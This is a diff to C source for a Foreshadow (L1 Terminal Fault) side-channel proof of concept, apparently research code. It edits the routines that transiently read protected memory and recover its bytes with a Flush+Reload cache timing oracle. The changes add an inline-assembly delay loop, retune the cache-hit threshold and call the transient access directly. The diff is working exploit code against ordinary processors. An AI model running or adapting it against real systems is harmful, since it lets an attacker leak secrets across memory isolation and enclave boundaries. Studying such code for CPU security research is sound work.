@@ -23,6 +23,7 @@
 #include "transient.h"
 #include "rtm.h"
 #include "debug.h"
+
 //#pragma optimize("gt", on)
 #include <stdio.h>
 #include <sys/reg.h>
@@ -45,7 +46,7 @@ int  __attribute__((aligned(0x1000))) fs_dummy;
 char __attribute__((aligned(0x1000))) fs_oracle[ORACLE_SIZE];
 
 /*kmarzouq code*/
-
+ 
 void mask (void *adrs, size_t malicious_x){
 
 	int tries, i, j, k, mix_i;
@@ -53,23 +54,22 @@ void mask (void *adrs, size_t malicious_x){
 	//size_t training_x, x;
 	//register uint64_t time1, time2;
     mix_i=0;
-    info("Is prob");
-    //training_x = FORESHADOW_ZERO_RETRIES % 64;    
-	for (j = 29; j >= 0; j--)
-	{
-		for (volatile int z = 0; z < 320; z++)  
-		{
-            //transient_access(fs_oracle, adrs, SLOT_SIZE);
-		}
-        /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
-		/* Avoid jumps in case those tip off the branch predictor */
-		//x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-		//x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
-		//x = training_x ^ (x & (malicious_x ^ training_x));
-		}
-        transient_access(fs_oracle, adrs, SLOT_SIZE);//transient_access causing issue
-    info("Is not prob, %d",mix_i);
+    int loop_count = 3200;
+    //info("Is prob");
+    
+        asm volatile(
+            "mov %[loop_count], %%ecx \n\t"  // Move loop_count into ECX register
+            "my_loop: \n\t"
+            "    dec %%ecx \n\t"            // Decrement ECX (counter)
+            "    jnz my_loop \n\t"          // Jump to my_loop if ECX is not zero
+            : [loop_count] "+r" (loop_count) // Output/input operand (read and updated by the loop)
+            :                               // No input operands
+            : "%ecx"                        // Clobbered registers
+        );
 
+        transient_access(fs_oracle, adrs, SLOT_SIZE);//transient_access causing issue
+    //info("Is not prob, %d",mix_i);
+        
 }
 
 void foreshadow_init(void)
@@ -78,7 +78,7 @@ void foreshadow_init(void)
     flush(&fs_dummy);
     t1 = reload(&fs_dummy);
     t2 = reload(&fs_dummy);
-    fs_reload_threshold = t1-t2-60;
+    fs_reload_threshold = t1-t2+55;//-60;
     info("cache hit/miss=%lu/%lu; reload threshold=%d", t2, t1, fs_reload_threshold);
 
     /* ensure all oracle pages are mapped in */
@@ -122,8 +122,8 @@ static inline int __attribute__((always_inline)) foreshadow_round(void *adrs)
      * NOTE: proof-of-concept only: calling application should catch exception
      * and properly restore access rights.
      */
-    mask(adrs,i);
-    //transient_access(fs_oracle, adrs, SLOT_SIZE);
+    //mask(adrs,i);
+    transient_access(fs_oracle, adrs, SLOT_SIZE);
     for (i=0; i < NUM_SLOTS; i++)
         if (reload( SLOT_OFFSET( fs_oracle, i ) ) < fs_reload_threshold)
             return i;
@@ -138,7 +138,7 @@ int foreshadow(void *adrs)
 
     if (!fs_reload_threshold) 
         foreshadow_init();
-
+    
     /* Be sceptic about 0x00 bytes to compensate for the bias */
     info("adrs is %p",adrs);
     for(j=0; (rv==0x00 || rv==0xff) && j < FORESHADOW_ZERO_RETRIES; j++, fs_zero_retries++);
@@ -221,4 +221,4 @@ int foreshadow_compare_secret(uint8_t *recovered, uint8_t *real, int len)
         info("[OK] Foreshadow correctly derived all %d bytes!", len);
 
     return rv;
-} 
+}
